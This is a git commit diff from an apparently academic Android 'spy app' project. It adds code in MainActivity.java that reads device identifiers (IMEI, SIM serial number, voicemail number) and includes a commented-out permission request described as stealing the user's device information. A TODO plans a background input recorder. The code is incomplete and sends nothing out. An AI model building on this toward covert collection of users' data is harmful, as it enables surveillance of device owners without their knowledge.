f8d95058dee279af81a2071eb6d1f7a27c3d18a1
Ciprian <ciliesj@gmail.com>
2019-10-25 09:03:14 -0700

    Began working on permissions request.

--- app/src/main/java/edu/csus/ecs/androidspyapp/MainActivity.java
+++ app/src/main/java/edu/csus/ecs/androidspyapp/MainActivity.java
@@ -1,17 +1,26 @@
 package edu.csus.ecs.androidspyapp;
 
+import android.Manifest;
+import android.content.pm.PackageManager;
 import android.os.Bundle;
 import android.support.design.widget.FloatingActionButton;
 import android.support.design.widget.Snackbar;
+import android.support.v4.app.ActivityCompat;
 import android.support.v7.app.AppCompatActivity;
 import android.support.v7.widget.Toolbar;
+import android.util.Log;
 import android.view.View;
 import android.view.Menu;
 import android.view.MenuItem;
 import android.telephony.TelephonyManager;
 import android.content.Context;
+import android.support.v4.content.ContextCompat;
 
 public class MainActivity extends AppCompatActivity {
+
+    String[] permissions = {"android.permission.READ_PHONE_STATE"};
+
+    private TelephonyManager telephonyManager;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -30,11 +39,30 @@ public class MainActivity extends AppCompatActivity {
         });
 
         //TODO: Initial app data acquisition here..
-//        TelephonyManager telephonyManager = (TelephonyManager)getSystemService.getSystemService(Context.TELEPHONY_SERVICE);
-//        String phoneNumber = telephonyManager .getLine1Number();
-//        String deviceID = telephonyManager.getDeviceId();
-//
-//        Log.d("SPY", "testing logging from onCreate()");
+        telephonyManager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
+        //String phoneNumber = telephonyManager.getLine1Number();
+
+        Log.d("SPY", "testing logging from onCreate()");
+
+        //Check for permission to steal the user's device information.
+//        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED)
+//        {
+//            //Ask for permission.
+//            if (ActivityCompat.shouldShowRequestPermissionRationale(thisActivity, Manifest.permission.READ_PHONE_STATE))
+//            {
+//                // Show an explanation to the user *asynchronously* -- don't block
+//                // this thread waiting for the user's response! After the user
+//                // sees the explanation, try again to request the permission.
+//            }
+//            else
+//                {
+//                // No explanation needed
+//                ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_PHONE_STATE}, MY_PERMISSIONS_REQUEST_READ_CONTACTS);
+//            }
+//        } else {
+//            // Permission has already been granted
+//              getDeviceInfo();
+//        }
 
         //TODO: Spawn background process that records all of your input and stuff.
     }
@@ -59,5 +87,17 @@ public class MainActivity extends AppCompatActivity {
         }
 
         return super.onOptionsItemSelected(item);
+    }
+
+    public void getDeviceInfo()
+    {
+        //TODO:
+        String IMEI = telephonyManager.getDeviceId();
+        String subscriberID = telephonyManager.getDeviceId();
+        String SIM_SN = telephonyManager.getSimSerialNumber();
+        String networkCountryISO = telephonyManager.getNetworkCountryIso();
+        String SIMCountryISO = telephonyManager.getSimCountryIso();
+        String softwareVersion = telephonyManager.getDeviceSoftwareVersion();
+        String voiceMailNumber = telephonyManager.getVoiceMailNumber();
     }
 }
